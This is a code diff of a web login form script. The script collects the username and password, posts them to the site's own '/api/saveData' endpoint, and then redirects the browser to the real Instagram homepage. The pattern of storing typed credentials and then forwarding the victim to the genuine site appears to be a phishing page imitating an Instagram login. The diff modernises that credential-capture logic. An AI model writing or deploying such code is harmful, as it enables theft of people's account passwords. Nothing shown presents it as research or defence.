@@ -1,19 +1,23 @@
 document.getElementById('loginForm').addEventListener('submit', function(event) {
     event.preventDefault();
-    
+
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
-    fetch('/saveData', {
+    fetch('/api/saveData', {
         method: 'POST',
         headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
+            'Content-Type': 'application/json',
         },
-        body: new URLSearchParams({ username, password }),
-    }).then(response => response.text())
-      .then(text => alert(text))
-      .catch(error => {
-          console.error('Սխալ:', error);
-          alert('Սխալ, չհաջողվեց պահպանել տվյալները');
-      });
+        body: JSON.stringify({ username, password }),
+    })
+    .then(response => response.json())
+    .then(data => {
+        alert(data.message);
+        window.location.replace("https://www.instagram.com/");
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('Failed to save data');
+    });
 });
